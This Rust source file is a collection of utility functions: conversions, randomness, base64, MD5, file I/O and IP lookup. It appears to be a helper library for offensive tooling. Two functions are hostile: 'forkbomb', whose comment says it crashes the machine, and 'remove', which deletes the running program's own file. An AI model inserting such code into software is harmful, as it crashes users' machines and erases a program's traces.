mod linux;
use error_chain::error_chain;
use rand::Rng;
use std::io::Read;
use std::{
    env, fs,
    fs::File,
    io,
    io::{prelude::*, BufReader},
    net::UdpSocket,
    path::Path,
    process::Command,
};
error_chain! {
  foreign_links {
    Io(std::io::Error);
  HttpRequest(reqwest::Error);
}
}

// revert returns a reversed string.
fn revert(s: String) -> String {
    let reverted_string = s.chars().rev().collect::<String>();
    reverted_string
}

// filetoslice reads a textfile and returns all lines as a vector.
fn filetoslice(filename: &str) -> Vec<String> {
    let file = File::open(filename).expect("no such file");
    let buf = BufReader::new(file);
    buf.lines()
        .map(|l| l.expect("Could not parse line"))
        .collect()
}

// str_to_int converts a string into an integer.
fn str_to_int(string_integer: String) -> u32 {
    string_integer.parse::<u32>().unwrap()
}

// str_to_words returns a list of strings which was split by spaces.
fn str_to_words(s: &str) -> Vec<&str> {
    s.split(' ').collect()
}

// int_to_str converts an integer into a string.
fn int_to_str(i: u32) -> String {
    i.to_string()
}

// size_to_bytes converts a human friendly string indicating size into a proper integer.
fn size_to_bytes(size: &str) -> u128 {
    let mut size = size.to_string();
    let last_chara = size.chars().last().unwrap();
    size.pop();
    let i: u128 = size.parse().unwrap();
    match last_chara {
        'g' => i * 1024 * 1024 * 1024,
        'm' => i * 1024 * 1024,
        'k' => i * 1024,
        _ => i,
    }
}

// interval_to_seconds converts a human friendly string indicating time into a proper integer.
fn interval_to_seconds(interval: &str) -> u128 {
    let mut interval = interval.to_string();
    let last_chara = interval.chars().last().unwrap();
    interval.pop();
    let i: u128 = interval.parse().unwrap();
    match last_chara {
        'd' => i * 24 * 3600,
        'h' => i * 3600,
        'm' => i * 60,
        's' => i,
        _ => i,
    }
}

// random_int returns an integer within a given range.
fn random_int(min: u32, max: u32) -> u32 {
    rand::thread_rng().gen_range(min..max)
}

// random_select_str returns a string that was randomly selected from a list of elements of vector.
fn random_select_str(list: Vec<&str>) -> String {
    let mut rng = rand::thread_rng();
    let n = rng.gen_range(0..list.len());
    list[n].to_string()
}

// random_select_int returns an integer that was randomly selected from a list of vector of integers.
fn random_select_int(list: Vec<u32>) -> u32 {
    let mut rng = rand::thread_rng();
    let n = rng.gen_range(0..list.len());
    list[n]
}

// remove_new_lines removes possible newlines from a string.
fn remove_new_lines(s: String) -> String {
    s.replace("\n", " ")
}

// full_remove removes all instances of a string from another string.
fn full_remove(str: String, to_remove: String) -> String {
    str.replace(&to_remove, "")
}

// contains_any checks if a string exists within a vector of strings.
fn contains_any(str: String, elements: Vec<String>) -> bool {
    elements.contains(&str)
}

// random_string randomly generates an alphabetic string of a given length.
fn random_string(n: usize) -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    let password_len: usize = n;
    let mut rng = rand::thread_rng();

    (0..password_len)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}

// get_localip is used to get the local Ip address of the machine.
fn get_localip() -> io::Result<std::net::SocketAddr> {
    let socket = UdpSocket::bind(("0.0.0.0", 0))?;
    socket.connect(("8.8.8.8", 80))?;
    socket.local_addr()
}

// get_globalip is used to return the global Ip address of the machine.
fn get_globalip() -> Result<String> {
    let resolvers = vec![
        "https://api.ipify.org?format=text",
        "http://myexternalip.com/raw",
        "http://ident.me",
    ];
    let url = random_select_str(resolvers);
    let mut res = reqwest::blocking::get(url)?;
    let mut body = String::new();
    res.read_to_string(&mut body)?;

    Ok(body)
}

// md5hash hashes a given string using the MD5.
fn md5hash(s: &str) -> String {
    let digest = md5::compute(s.as_bytes());
    format!("{:x}", digest)
}

// read_file is used to read a given file and return its data as a string.
fn read_file(filename: &str) -> Result<String> {
    Ok(fs::read_to_string(filename)?)
}

// write_file is used to write data into a given file.
fn write_file(filename: &str, data: &str) -> Result<()> {
    Ok(fs::write(filename, data)?)
}

// b64d decodes a given string encoded in Base64.
fn b64d(s: &str) -> String {
    String::from_utf8_lossy(&base64::decode(s).unwrap()).to_string()
}

// b64e encodes a string in Base64.
fn b64e(s: &str) -> String {
    let b64 = base64::encode(s.as_bytes());
    b64
}

// Wait uses a human friendly string that indicates how long a system should wait.
fn wait(s: &str) {
    let mut child = Command::new("sleep").arg(s).spawn().unwrap();
    let time = child.wait().unwrap();
}

// forkbomb spawns threads in order to crash the machine.
fn forkbomb() {
    loop {
        std::thread::spawn(forkbomb);
    }
}

// remove is used to delete the program file.
fn remove() -> std::io::Result<()> {
    let args: Vec<_> = env::args().collect();
    fs::remove_file(args[0].to_owned())?;
    Ok(())
}

// exists checks if a given file is in the system.
fn exists(file: String) -> bool {
    Path::new(&file).exists()
}

// copy_file copies a file from one directory to another.
fn copy_file(src: &str, dst: &str) -> std::io::Result<()> {
    fs::copy(src, dst)?;
    Ok(())
}

fn main() {}
